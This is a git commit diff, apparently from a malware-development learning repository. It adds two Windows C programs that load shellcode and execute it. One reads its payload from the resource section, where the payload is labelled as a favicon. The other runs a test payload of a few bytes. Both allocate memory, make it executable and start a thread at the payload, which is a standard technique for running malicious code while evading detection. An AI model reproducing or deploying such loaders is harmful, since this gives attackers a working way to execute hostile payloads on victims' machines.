a0e1365b027dfa5e2889a28484dc2bced0074056
0xvpr <malikrb@live.com>
2021-08-23 03:04:03 -0500

    structure changes;

---
+++ rsc/main.c
@@ -0,0 +1,42 @@
+#include "resources.h"
+
+#include <windows.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void)
+{
+	void* exec_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD old_protect = 0;
+	HRSRC res;
+
+	// Extract payload from resources section
+	res = FindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
+	HGLOBAL hRes = LoadResource(NULL, res);
+
+	// Create payload
+	unsigned char* payload = (unsigned char *)LockResource(hRes);
+	size_t payload_size = SizeofResource(NULL, res);
+
+	// Allocate a memory buffer for payload
+	exec_mem = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	printf("Payload address: 0x%-16p\n", (void *)payload);
+	printf("Executable memory address: 0x%-16p\n", (void *)exec_mem);
+
+	// Copy payload to a new memory buffer and make it executable
+	RtlMoveMemory(exec_mem, payload, payload_size);
+	rv = VirtualProtect(exec_mem, payload_size, PAGE_EXECUTE_READ, &old_protect);
+
+	system("pause");
+
+	if (rv)
+	{
+		th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+		WaitForSingleObject(th, INFINITE);
+	}
+
+	return 0;
+}
---
+++ text/main.c
@@ -0,0 +1,38 @@
+#include <windows.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+int main(void)
+{
+	void* exec_mem;
+	BOOL rv;
+	HANDLE th;
+	DWORD old_protect;
+
+	unsigned char payload[4] = {
+		0x90,  // nop
+		0x90,  // nop
+		0xCC,  // int3
+		0xC3   // ret
+	};
+	size_t size = 4;
+
+	// Allocate a memory buffer for payload
+	exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	printf("Payload address: 0x%-16p\n", (void *)payload);
+	printf("Executable memory address: 0x%-16p\n", (void *)exec_mem);
+
+	RtlMoveMemory(exec_mem, payload, size);
+	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old_protect);
+
+	system("pause");
+
+	if (rv)
+	{
+		th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+		WaitForSingleObject(th, INFINITE);
+	}
+
+	return 0;
+}
